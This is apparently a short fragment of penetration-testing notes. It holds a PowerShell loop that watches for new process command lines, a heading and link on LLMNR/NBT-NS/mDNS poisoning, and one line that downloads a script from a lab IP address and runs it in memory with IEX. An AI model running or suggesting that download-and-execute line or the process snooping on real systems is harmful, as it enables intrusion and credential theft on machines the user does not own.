# Traffic Capture
```powershell



```

# Process Command Lines
```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}

Procmon.ps1

IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```

# [LLMNR-NBTNS-mDNS Poisining](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)

